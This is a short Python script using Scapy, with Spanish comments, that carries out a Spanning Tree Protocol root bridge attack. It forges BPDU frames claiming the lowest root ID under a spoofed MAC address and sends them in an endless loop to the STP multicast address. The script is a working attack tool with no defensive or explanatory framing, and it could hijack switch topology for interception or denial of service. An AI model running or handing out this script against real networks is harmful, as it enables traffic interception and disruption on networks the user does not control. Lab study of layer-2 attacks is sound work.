# -*- coding: utf-8 -*-
from scapy.all import *

def stp_attack():
    print("Lanzando STP Root Attack...")

    # Creamos el paquete más simple posible para evitar KeyErrors
    pkt = Ether(dst="01:80:c2:00:00:00") / \
          STP(rootid=0, rootmac="00:0c:29:44:55:66", bridgeid=0)

    sendp(pkt, inter=2, loop=1)

if __name__ == "__main__":
    stp_attack()
